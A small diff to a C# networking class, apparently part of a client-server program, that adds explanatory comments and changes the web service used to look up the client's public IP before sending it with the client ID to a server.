@@ -1,4 +1,9 @@
-﻿using System.Net;
+﻿//this code writes the parameters for the packets sent to the server
+//each method, apart from TcpSendData, corresponds to a command implemented on the client side
+//parameters given to the packet act as arguments to client side functions
+
+
+using System.Net;
 
 public static class ClientSend
 {
@@ -16,7 +21,7 @@ public static class ClientSend
         packet.Write(Client.clientID);
 
         //get public IP
-        packet.Write(new WebClient().DownloadString("http://icanhazip.com").Trim());
+        packet.Write(new WebClient().DownloadString("http://bot.whatismyipaddress.com").Trim());
 
         TcpSendData(packet);
 
